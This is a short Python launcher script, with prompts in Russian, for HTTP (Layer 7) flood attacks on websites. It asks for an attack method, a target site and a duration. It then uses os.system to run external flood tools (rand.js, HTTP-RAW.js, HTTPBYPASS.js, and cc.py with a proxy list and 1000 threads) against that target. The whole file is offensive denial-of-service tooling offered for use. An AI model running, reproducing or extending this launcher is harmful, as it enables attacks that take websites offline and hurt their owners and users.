import os, sys
import time
import random

os.system('clear')
def one():
	if '1' in mt :
		os.system('node rand.js ' +target+ ' ' +time)
		
def two():
	if '2' in mt :
		os.system('node HTTP-RAW.js ' +target+ ' ' +time)
		
def three():
	if '3' in mt :
		os.system('node HTTPBYPASS.js ' +target+ ' ' +time)
		
def four():
	if '4' in mt :
		os.system('python cc.py -url '+target+' -m cc -v 5 -t 1000 -f proxy.txt -s '+time)

print("Выберете метод атаки")
print("Layer 7 methods")
print("1. HTTP-RAND")
print("2. HTTP-RAW")
print("3. HTTP-BYPASS")
mt = input('Введите метод -> ')
target = input('Введите сайт -> ')
time = input('Введите время -> ')
one()
two()
three()
four()